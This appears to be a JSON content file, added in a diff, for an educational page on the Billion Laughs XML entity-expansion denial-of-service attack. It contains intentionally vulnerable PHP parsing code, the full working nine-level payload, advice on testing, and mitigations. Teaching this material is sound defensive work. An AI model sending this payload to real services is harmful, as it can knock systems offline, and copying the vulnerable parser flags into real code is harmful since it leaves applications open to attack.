@@ -1,0 +1,191 @@
+[
+  {
+    "type": "section_heading",
+    "id": "billion-laughs-intro",
+    "text": "What is Billion Laughs Attack?"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-definition",
+    "text": "Billion Laughs is an XML Entity Expansion Denial of Service attack where nested entities recursively expand into exponentially large text, exhausting memory and CPU during XML parsing."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-root-cause",
+    "text": "Root Cause"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-root-analysis",
+    "text": "The attack works when the XML parser allows internal DTD processing and entity expansion (e.g., LIBXML_NOENT | LIBXML_DTDLOAD). The parser recursively replaces entity references without strict expansion limits."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-vulnerable-code",
+    "text": "Vulnerable PHP Code"
+  },
+  {
+    "type": "code_block",
+    "id": "billion-php-code",
+    "language": "php",
+    "code": "<?php\nlibxml_use_internal_errors(true);\n\n$xml = file_get_contents(\"php://input\");\n\n$dom = new DOMDocument();\n$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);\n\necho \"Parsed successfully\";\n?>"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-code-analysis",
+    "text": "LIBXML_DTDLOAD loads DTD definitions. LIBXML_NOENT forces entity expansion. Together they allow recursive entity substitution during parsing."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-malicious-payload",
+    "text": "Classic Billion Laughs Payload"
+  },
+  {
+    "type": "code_block",
+    "id": "billion-payload",
+    "language": "xml",
+    "code": "<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n <!ENTITY lol \"lol\">\n <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n]>\n<root>&lol9;</root>"
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-math-explosion",
+    "text": "Exponential Growth Calculation"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-math-analysis",
+    "text": "Base entity length = 3 bytes ('lol'). Each level multiplies by 10. Final size at level n = 3 × (10^n). At level 9 → 3 × 10^9 = 3,000,000,000 bytes (~3GB)."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-internal-mechanism",
+    "text": "Internal Parser Execution Flow"
+  },
+  {
+    "type": "explanation",
+    "id": "billion-internal-flow",
+    "title": "How libxml Expands Entities",
+    "items": [
+      "Parser reads DOCTYPE and builds entity table.",
+      "Entity definitions are stored in a hash map.",
+      "When &lol9; is encountered, recursive expansion begins.",
+      "Each entity is replaced by its defined value.",
+      "Replacement buffers are allocated on heap.",
+      "Nested replacements trigger further recursion.",
+      "Memory grows exponentially due to repeated string concatenation.",
+      "CPU usage spikes due to recursive decoding."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-memory-behavior",
+    "text": "Memory and CPU Behavior"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-memory-analysis",
+    "text": "Each expansion requires new buffer allocation and copying of previous content. Intermediate buffers also consume memory. Actual usage exceeds theoretical final text size."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-observe-system",
+    "text": "Observing Resource Exhaustion"
+  },
+  {
+    "type": "code_block",
+    "id": "billion-monitor",
+    "language": "bash",
+    "code": "htop\n# or\nps aux | grep php"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-monitor-analysis",
+    "text": "During attack, PHP process shows high CPU utilization and rapid memory growth. On unprotected systems, this leads to memory exhaustion or OOM killer termination."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-safe-testing",
+    "text": "Safe Testing Strategy"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-safe-analysis",
+    "text": "Reduce depth (e.g., up to lol4 or lol5) or reduce multiplier (5 instead of 10). This prevents multi‑GB expansion and allows safe observation."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-modern-protection",
+    "text": "Modern libxml Protections"
+  },
+  {
+    "type": "explanation",
+    "id": "billion-modern-limits",
+    "title": "Built-in Defenses in libxml 2.11+",
+    "items": [
+      "Entity expansion counter limit.",
+      "Maximum recursion depth restriction.",
+      "Maximum text node size limit.",
+      "Abort parsing on expansion overflow.",
+      "Internal loop detection."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-error-observation",
+    "text": "Detecting Protection Trigger"
+  },
+  {
+    "type": "code_block",
+    "id": "billion-error-code",
+    "language": "php",
+    "code": "foreach (libxml_get_errors() as $error) {\n    echo $error->message;\n}"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-error-analysis",
+    "text": "Modern parsers may output errors like 'Entity expansion limit exceeded' or 'Detected an entity reference loop'."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-variants",
+    "text": "Variants Beyond Classic Billion Laughs"
+  },
+  {
+    "type": "explanation",
+    "id": "billion-variants-list",
+    "title": "Advanced DoS Variants",
+    "items": [
+      "Quadratic Blowup (large base entity repeated many times).",
+      "Parameter Entity Bomb using %entities.",
+      "Hybrid XXE + DoS (external DTD + expansion).",
+      "Compression-style nested payloads.",
+      "Deep but narrow recursion chains."
+    ]
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-mitigation",
+    "text": "Mitigation"
+  },
+  {
+    "type": "code_block",
+    "id": "billion-secure-code",
+    "language": "php",
+    "code": "$dom->loadXML($xml, LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING);\n$dom->resolveExternals = false;\n$dom->substituteEntities = false;"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-mitigation-analysis",
+    "text": "Disable DTD processing and entity substitution. Avoid LIBXML_NOENT in production. Enforce strict memory limits at application level."
+  },
+  {
+    "type": "section_heading",
+    "id": "billion-conclusion",
+    "text": "Conclusion"
+  },
+  {
+    "type": "order_block",
+    "id": "billion-summary",
+    "text": "Billion Laughs is a parser-level Denial of Service attack exploiting recursive entity expansion. Modern parsers implement strict expansion limits, but legacy systems and custom parsers remain vulnerable."
+  }
+]
